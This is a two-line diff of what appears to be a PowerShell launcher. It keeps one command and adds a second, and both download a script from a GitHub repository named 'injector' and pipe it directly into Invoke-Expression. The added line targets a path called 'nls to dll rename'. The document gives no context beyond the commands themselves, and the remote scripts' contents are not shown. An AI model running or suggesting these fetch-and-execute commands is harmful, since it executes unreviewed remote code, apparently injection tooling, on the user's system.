@@ -1,1 +1,2 @@
 irm -Uri "https://raw.githubusercontent.com/tasfik1974/injector/main/script.ps1" | iex
+iex (irm "https://raw.githubusercontent.com/tasfik1974/injector/main/nls%20to%20dll%20rename/script.ps1")
